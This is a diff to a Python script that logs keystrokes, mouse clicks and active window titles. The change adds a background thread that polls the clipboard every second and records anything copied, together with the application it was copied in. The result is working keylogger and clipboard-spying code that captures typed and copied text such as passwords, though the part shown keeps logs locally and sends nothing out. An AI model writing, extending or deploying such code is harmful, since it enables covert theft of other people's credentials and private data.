@@ -3,6 +3,9 @@ from datetime import datetime
 from pynput import keyboard, mouse
 import platform
 import win32gui  # For detecting active window on Windows
+import pyperclip  # For clipboard monitoring
+import threading  # To run clipboard monitoring in a separate thread
+import time  # For periodic clipboard checks
 
 # Create a log directory
 log_dir = "logs"
@@ -27,6 +30,20 @@ def get_active_window():
     except Exception as e:
         return f"Error: {e}"
 
+# Clipboard Monitoring
+def monitor_clipboard():
+    last_clipboard_content = ""
+    while True:
+        try:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != last_clipboard_content:  # Check if clipboard content has changed
+                app = get_active_window()
+                write_log(f"Clipboard Copied: '{clipboard_content}' in {app}")
+                last_clipboard_content = clipboard_content
+        except Exception as e:
+            write_log(f"Error monitoring clipboard: {e}")
+        time.sleep(1)  # Check clipboard every second
+
 # Keyboard Listener: Log keystrokes
 def on_key_press(key):
     try:
@@ -46,6 +63,10 @@ def on_click(x, y, button, pressed):
         write_log(f"Mouse {action}: {button} at ({x}, {y}) in {app}")
     except Exception as e:
         write_log(f"Error capturing mouse event: {e}")
+
+# Start clipboard monitoring in a separate thread
+clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
+clipboard_thread.start()
 
 # Start listeners for both keyboard and mouse
 keyboard_listener = keyboard.Listener(on_press=on_key_press)
